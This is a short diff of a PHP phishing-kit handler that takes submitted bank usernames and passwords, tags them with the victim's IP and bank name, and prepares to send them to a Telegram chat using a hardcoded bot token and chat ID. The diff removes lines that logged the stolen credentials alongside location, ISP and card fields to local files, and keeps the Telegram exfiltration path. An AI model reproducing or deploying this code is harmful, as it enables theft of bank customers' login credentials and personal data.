@@ -1,5 +1,3 @@
-
-
 <?php
 
     $user       = $_POST['username'];
@@ -8,9 +6,7 @@
 
 
 $message =" $bank$lh$ip\n\n---$user\n\n$pass\n\n";
-file_put_contents($file2, "$date$li$time$li$ip$li$bsr$li$uos$li$country$li$city$li$continent$li$tp$li$cn$li$is$li$la$li$lp$li$crn$li$type$li$bank$li$url$li$logo$li$gitusr$li$mapurl$li$isp$li$user$li$pass$li$code\n", FILE_APPEND); 
-file_put_contents($file, "$message\n////[$date]////////[$time]////////////[$bank]//[TELEGRAM-LOG]//\n", FILE_APPEND);file_put_contents($file3, "$date$li$time$li$url$li$bank$li$ili$user$li$pass\n", FILE_APPEND);
-file_put_contents($file4, "$date$lh$time$lh$ip$lh$uaget\n", FILE_APPEND);
+
 $apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
 $data = [
     'chat_id' => '-1001831940786',
